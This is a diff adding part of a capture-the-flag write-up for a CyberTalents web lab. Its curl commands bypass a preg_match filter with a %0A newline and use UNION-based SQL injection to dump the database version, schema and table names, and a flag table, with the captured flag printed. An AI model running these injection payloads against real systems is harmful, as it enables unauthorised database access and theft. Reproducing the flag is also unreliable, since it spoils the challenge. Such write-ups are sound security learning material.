@@ -44,4 +44,48 @@ Try cause error in the sql with `'` we got `Hack Detected`
 
 It trigger the if condition. 
 
+### Try to bypass it
+Because we have `preg_match` we can bypass it with new line `%0A`
+
+#### Enumerate the database
+- Version
+```bash
+curl http://wcamxwl32pue3e6mk873oo7fw3y0j6zqdkgxu639-web.cybertalentslabs.com -d "search=test%0A ' union SELECT @@version #"
+
+10.3.23-MariaDB-0+deb10u1
+```
+- Dump Databases
+```bash
+curl http://wcamxwl32pue3e6mk873oo7fw3y0j6zqdkgxu639-web.cybertalentslabs.com -d "search=test%0A ' union SELECT schema_name FROM information_schema.schemata #"
+
+information_schema
+```
+- Dump tables
+```bash
+curl http://wcamxwl32pue3e6mk873oo7fw3y0j6zqdkgxu639-web.cybertalentslabs.com -d "search=test%0A ' union SELECT table_schema AS schema_name, table_name FROM information_schema.tables #"
+
+No ouput
+```
+
+- Dump number of tables in the database
+```bash
+curl http://wcamxwl32pue3e6mk873oo7fw3y0j6zqdkgxu639-web.cybertalentslabs.com -d "search=test%0A ' union SELECT COUNT(*) FROM information_schema.tables #"  
+
+161
+```
+Note: we can't veiw the tables because the database has **161** table.
+
+- Dump topics table
+```bash
+curl http://wcamxwl32pue3e6mk873oo7fw3y0j6zqdkgxu639-web.cybertalentslabs.com -d "search=test%0A ' union SELECT * FROM topics #"
+
+Owels Laughs at Youu !!
+```
+- Dump flag
+```bash
+curl http://wcamxwl32pue3e6mk873oo7fw3y0j6zqdkgxu639-web.cybertalentslabs.com -d "search=test%0A ' union SELECT * FROM flag #"
+
+Flag{R3G3X_Ar3_N0T_G00D_For_OW3ls}
+```
+
 >Find More on ==> github.com/MedhatHassan 
